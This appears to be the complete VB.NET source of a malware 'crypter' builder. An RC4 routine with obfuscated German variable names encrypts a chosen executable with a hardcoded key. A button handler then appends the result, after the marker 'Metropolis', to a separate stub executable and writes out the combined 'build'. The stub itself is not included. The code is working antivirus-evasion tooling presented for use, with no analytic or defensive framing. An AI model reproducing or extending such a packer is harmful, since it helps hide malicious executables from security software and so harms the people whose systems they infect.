
Imports System.Text

Imports System

Public Class Form1

    Const filesplit = "Metropolis"

    Public Shared Function RonCode4(ByVal message As String, ByVal password As String) As String

        Dim T As Integer = 0

        Dim E As Integer = 0

        Dim Chiffre As New StringBuilder

        Dim returnChiffre As String = String.Empty

        Dim sBlockverschlüsselungen As Integer() = New Integer(256) {}

        Dim Schlüssel As Integer() = New Integer(256) {}

        Dim IntPass As Integer = password.Length

        Dim Informationssicherheit As Integer = 0

        While Informationssicherheit <= 255

            Dim Optimierung As Char = (password.Substring((Informationssicherheit Mod IntPass), 1).ToCharArray()(0))

            Schlüssel(Informationssicherheit) = Microsoft.VisualBasic.Strings.Asc(Optimierung)

            sBlockverschlüsselungen(Informationssicherheit) = Informationssicherheit

            System.Math.Max(System.Threading.Interlocked.Increment(Informationssicherheit), Informationssicherheit - 1)

        End While

        Dim z As Integer = 0

        Dim w As Integer = 0

        While w <= 255

            z = (z + sBlockverschlüsselungen(w) + Schlüssel(w)) Mod 256

            Dim Informationaustauschen As Integer = sBlockverschlüsselungen(w)

            sBlockverschlüsselungen(w) = sBlockverschlüsselungen(z)

            sBlockverschlüsselungen(z) = Informationaustauschen

            System.Math.Max(System.Threading.Interlocked.Increment(w), w - 1)

        End While

        Informationssicherheit = 1

        While Informationssicherheit <= message.Length

            Dim TOptimierung As Integer = 0

            T = (T + 1) Mod 256

            E = (E + sBlockverschlüsselungen(T)) Mod 256

            TOptimierung = sBlockverschlüsselungen(T)

            sBlockverschlüsselungen(T) = sBlockverschlüsselungen(E)

            sBlockverschlüsselungen(E) = TOptimierung

            Dim H As Integer = sBlockverschlüsselungen((sBlockverschlüsselungen(T) + sBlockverschlüsselungen(E)) Mod 256)

            Dim Optimierung As Char = message.Substring(Informationssicherheit - 1, 1).ToCharArray()(0)

            TOptimierung = Asc(Optimierung)

            Dim Chiffreby As Integer = TOptimierung Xor H

            Chiffre.Append(Chr(Chiffreby))

            System.Math.Max(System.Threading.Interlocked.Increment(Informationssicherheit), Informationssicherheit - 1)

        End While

        returnChiffre = Chiffre.ToString

        Chiffre.Length = 0

        Return returnChiffre

    End Function

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Dim Datei As New OpenFileDialog

        If Datei.ShowDialog = Windows.Forms.DialogResult.OK Then

            TextBox1.Text = Datei.FileName

        Else : Exit Sub

        End If

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        ProgressBar1.Value = 50

        Crypt()

        ProgressBar1.Value = 100

        MsgBox("Build Fertig...")

        ProgressBar1.Value = 0

    End Sub

    Private Function Crypt()

        Dim Datei As String

        Dim Dateiname As String

        Dim Stub As String

        Dim save As New SaveFileDialog

        If save.ShowDialog = Windows.Forms.DialogResult.OK Then

            Dateiname = save.FileName

        Else : Exit Function

        End If

        FileOpen(1, TextBox1.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)

        Datei = Space(LOF(1))

        FileGet(1, Datei)

        FileClose(1)

        FileOpen(1, Application.StartupPath & "\Stub\Stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)

        Stub = Space(LOF(1))

        FileGet(1, Stub)

        FileClose(1)

        FileOpen(1, Dateiname, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)

        FilePut(1, Stub & filesplit & RonCode4(Datei, "0101100101010010101010101"))

        FileClose(1)

    End Function


End Class
